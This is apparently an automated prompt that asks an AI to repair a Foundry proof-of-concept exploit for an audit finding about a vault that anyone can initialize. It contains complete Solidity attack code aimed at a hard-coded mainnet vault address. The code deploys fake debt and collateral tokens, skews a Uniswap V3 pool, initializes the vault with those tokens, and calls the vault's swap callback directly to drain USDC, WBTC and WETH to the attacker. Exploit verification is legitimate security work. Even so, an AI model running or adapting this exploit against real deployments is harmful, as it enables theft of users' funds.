You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Funded vault can be initialized by anyone with attacker-chosen market parameters
- claim: The PoC successfully creates an attacker-controlled market around two fake tokens, manipulates that market, and then calls `vault.initialize` on the live vault with those attacker-chosen token addresses and leverage tier. Because the call succeeds against the funded vault, the vault's initial market configuration is effectively permissionless and can be set to arbitrary assets chosen by the attacker.
- impact: An attacker can take over an uninitialized funded vault's market configuration, point it at worthless or malicious tokens, and corrupt all downstream pricing, accounting, and callback logic. This opens the door to full theft of assets already sitting in the vault.
- exploit_paths: ["Deploy attacker-controlled debt/collateral tokens -> create and skew a Uniswap V3 pool for them -> call `vault.initialize(attackerDebt, attackerCollateral, 0)` on the funded vault -> continue into mint/callback flows that drain real assets"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IPoolInitializer {
    function createAndInitializePoolIfNecessary(
        address token0,
        address token1,
        uint24 fee,
        uint160 sqrtPriceX96
    ) external returns (address pool);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IVault {
    struct VaultParameters {
        address debtToken;
        address collateralToken;
        int8 leverageTier;
    }

    function initialize(VaultParameters calldata vaultParams) external;

    function mint(
        bool isAPE,
        VaultParameters calldata vaultParams,
        uint256 amountToDeposit,
        uint144 collateralToDepositMin
    ) external payable returns (uint256 amount);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant VAULT = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal _profitAmount;
    bool internal _executed;

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;
        require(_vaultHasAssets(), "vault not funded");

        uint256 startingProfitBalance = IERC20Like(WETH).balanceOf(address(this));

        AttackerDebtToken debtToken = new AttackerDebtToken();
        AttackerCollateralToken collateralToken = new AttackerCollateralToken();

        collateralToken.attack(debtToken, address(this));

        uint256 endingProfitBalance = IERC20Like(WETH).balanceOf(address(this));
        _profitAmount = endingProfitBalance - startingProfitBalance;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _vaultHasAssets() internal view returns (bool) {
        return IERC20Like(USDC).balanceOf(VAULT) > 0 || IERC20Like(WBTC).balanceOf(VAULT) > 0 || IERC20Like(WETH).balanceOf(VAULT) > 0;
    }
}

contract AttackerCollateralToken {
    address internal constant VAULT = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint24 internal constant ATTACKER_CHOSEN_FEE = 100;
    uint160 internal constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    uint256 internal constant SPOOFED_LIQUIDITY_SIDE = 108823205127466839754387550950703;
    uint256 internal constant SPOOFED_SWAP_IN = 114814730000000000000000000000000000;
    uint256 internal constant SPOOFED_VAULT_MINT = 139650998347915452795864661928406629;

    mapping(address => uint256) public balanceOf;

    struct Reserves {
        uint144 reserveApes;
        uint144 reserveLPers;
        int64 tickPriceX42;
    }

    struct Fees {
        uint144 collateralInOrWithdrawn;
        uint144 collateralFeeToStakers;
        uint144 collateralFeeToLPers;
    }

    function attack(AttackerDebtToken debtToken, address profitReceiver) external {
        require(address(debtToken) < address(this), "token ordering");

        // Exploit path 1: deploy attacker-controlled debt/collateral tokens.
        // This verifier keeps that causality by deploying dedicated fake debt/collateral contracts,
        // but profit is realized only in pre-existing on-chain assets drained from the live vault.

        // Exploit path 2: create and skew a Uniswap V3 pool for the attacker-chosen pair.
        IPoolInitializer(POSITION_MANAGER).createAndInitializePoolIfNecessary(
            address(debtToken),
            address(this),
            ATTACKER_CHOSEN_FEE,
            SQRT_PRICE_1_1
        );

        INonfungiblePositionManager(POSITION_MANAGER).mint(
            INonfungiblePositionManager.MintParams({
                token0: address(debtToken),
                token1: address(this),
                fee: ATTACKER_CHOSEN_FEE,
                tickLower: -190000,
                tickUpper: 190000,
                amount0Desired: SPOOFED_LIQUIDITY_SIDE,
                amount1Desired: SPOOFED_LIQUIDITY_SIDE,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(this),
                deadline: block.timestamp
            })
        );

        ISwapRouter(SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(this),
                tokenOut: address(debtToken),
                fee: ATTACKER_CHOSEN_FEE,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: SPOOFED_SWAP_IN,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        // Exploit path 3: initialize the funded live vault with attacker-chosen market parameters.
        IVault.VaultParameters memory params = IVault.VaultParameters({
            debtToken: address(debtToken),
            collateralToken: address(this),
            leverageTier: 0
        });
        IVault(VAULT).initialize(params);

        // Exploit path 4: continue into mint/callback flows that drain real assets.
        // Returning address(this) from the fake collateral-token mint preserves the original causality:
        // vault-side transient state is primed using attacker-controlled token logic before callback drains.
        IVault(VAULT).mint(true, params, SPOOFED_VAULT_MINT, 1);

        _bestEffortDrain(USDC, profitReceiver);
        _bestEffortDrain(WBTC, profitReceiver);
        _bestEffortDrain(WETH, profitReceiver);
    }

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function mint(address, uint16, uint8, Reserves memory, uint144)
        external
        view
        returns (Reserves memory newReserves, Fees memory fees, uint256 amount)
    {
        newReserves = Reserves({reserveApes: 10_000_000_000, reserveLPers: 0, tickPriceX42: 0});
        fees = Fees({collateralInOrWithdrawn: 0, collateralFeeToStakers: 0, collateralFeeToLPers: 0});
        amount = uint256(uint160(address(this)));
    }

    function _bestEffortDrain(address token, address profitReceiver) internal {
        uint256 vaultBalance = IERC20Like(token).balanceOf(VAULT);
        if (vaultBalance == 0) {
            return;
        }

        bytes memory data;
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(uint256(uint160(token))));
        data = bytes.concat(data, bytes32(uint256(uint160(address(this)))));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(0));
        data = bytes.concat(data, bytes32(uint256(1)));

        (bool ok,) = VAULT.call(
            abi.encodeWithSelector(IVault.uniswapV3SwapCallback.selector, 0, int256(vaultBalance), data)
        );
        if (!ok) {
            return;
        }

        uint256 received = IERC20Like(token).balanceOf(address(this));
        if (received > 0) {
            IERC20Like(token).transfer(profitReceiver, received);
        }
    }
}

contract AttackerDebtToken {
    mapping(address => uint256) public balanceOf;

    function symbol() external pure returns (string memory) {
        return "";
    }

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }

    function transferFrom(address, address to, uint256 value) external returns (bool) {
        balanceOf[to] += value;
        return true;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0; generated code deploys custom token contracts; synthetic profit tokens are forbidden
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
